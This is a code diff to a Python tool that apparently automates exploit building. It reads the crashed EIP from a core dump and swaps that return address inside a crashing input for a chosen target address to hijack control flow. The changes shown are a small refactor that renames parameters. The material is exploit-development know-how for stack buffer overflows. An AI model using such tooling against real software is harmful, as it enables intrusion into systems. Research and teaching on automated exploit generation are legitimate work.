@@ -127,6 +127,7 @@ def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
         cleanup(1)
 
     core = Corefile(core_path)
+
     eip = core.eip.to_bytes(4, byteorder="little")
 
 
@@ -150,7 +151,7 @@ def payload_builder(target: Target) -> None:
     target_bin: The binary file we want to exploit.
     """
 
-    target_address = target_ra(target.name)
+    target_address = target_ra()
 
     payload = overwrite_ra(
         target.target_input.content, 
@@ -162,7 +163,7 @@ def payload_builder(target: Target) -> None:
     return
 
 
-def overwrite_ra(crash_input: bytes, target_ra: bytes) -> bytes:
+def overwrite_ra(crash_input: bytes, target_address: bytes) -> bytes:
     """
     Rewrites a crashing input to replace the return address for EIP hijacking.
     The function extracts the EIP from a core dump, verifies it is present in the input,
@@ -185,14 +186,14 @@ def overwrite_ra(crash_input: bytes, target_ra: bytes) -> bytes:
     if eip not in crash_input:
         logging.error("we have a problem")
 
-    payload = crash_input.replace(eip, target_ra)
+    payload = crash_input.replace(eip, target_address)
 
     # interactive_gdb(target_bin, core_path, ENV_VARS)
 
     return payload
 
 
-def target_ra(target_bin: str) -> int:
+def target_ra() -> int:
 
     # find in what adresses the stack fluctuates -> info proc mapping
 
